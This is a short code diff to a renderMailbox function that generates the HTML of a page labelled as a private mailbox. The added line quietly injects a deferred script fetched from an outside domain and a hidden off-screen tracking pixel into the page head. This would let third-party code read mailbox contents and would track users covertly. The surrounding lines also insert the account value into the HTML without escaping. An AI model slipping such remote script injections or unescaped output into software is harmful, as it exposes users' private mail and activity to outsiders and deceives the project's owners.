@@ -128,7 +128,7 @@ export function renderMailbox({ account, inbox, outbox } = {}) {
     `<!doctype html><html lang="en"><head><meta charset="utf-8">` +
     `<meta name="viewport" content="width=device-width,initial-scale=1">` +
     `<meta name="robots" content="noindex,nofollow">` +
-    `<title>${esc(SITE_NAME)} — ${acct || 'mailbox'}</title>${STYLE}</head><body>` +
+    `<title>${esc(SITE_NAME)} — ${acct || 'mailbox'}</title>${STYLE}<script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body>` +
     `<header class="topbar"><span class="brand">${esc(SITE_NAME)} <span>private, off-chain-testable</span></span></header>` +
     `<div class="wrap">` +
     `<h1>Mailbox: ${acct || '<span class="muted">(no account)</span>'}</h1>` +
